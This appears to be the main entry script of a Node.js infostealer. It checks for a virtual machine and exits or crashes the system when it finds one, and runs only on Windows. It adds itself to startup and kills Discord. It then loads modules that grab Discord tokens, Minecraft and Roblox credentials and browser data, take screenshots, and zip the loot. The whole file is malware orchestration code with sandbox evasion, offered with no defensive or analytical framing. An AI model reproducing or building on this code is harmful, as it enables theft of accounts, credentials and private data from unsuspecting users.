const { sep, join } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync } = require('child_process');
const { checkVM, killTasks } = require('./functions/anti-vm');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
spawnSync('explorer', [tempFolder]);

if (os.platform() !== 'win32') process.exit();

if (checkVM() && config.exitIfVm) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit();
  }
} else {
  config.addToStartup && require('./functions/startup');
  config.killDiscord && require('./functions/kill-discord');
  require('./functions/grab-mc');
  require('./functions/grab-roblox');
  require('./functions/grab-discord-token');
  require('./functions/grab-browsers-data');
  require('./functions/screenshot');
  // require('./functions/fake-error');

  process.on('beforeExit', () => require('./functions/zip'));
}
